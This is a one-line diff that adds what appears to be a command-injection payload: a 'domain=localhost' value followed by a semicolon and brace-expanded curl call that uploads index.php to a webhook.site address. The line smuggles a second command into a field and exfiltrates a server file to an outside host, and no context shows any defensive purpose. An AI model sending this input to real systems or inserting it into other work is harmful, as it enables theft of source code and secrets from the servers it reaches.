@@ -1,0 +1,1 @@
+domain=localhost;{curl,-X,GET,-F,file=@index.php,http://webhook.site/746cfac5-063f-46c8-bbd3-1da0e472f0a6}
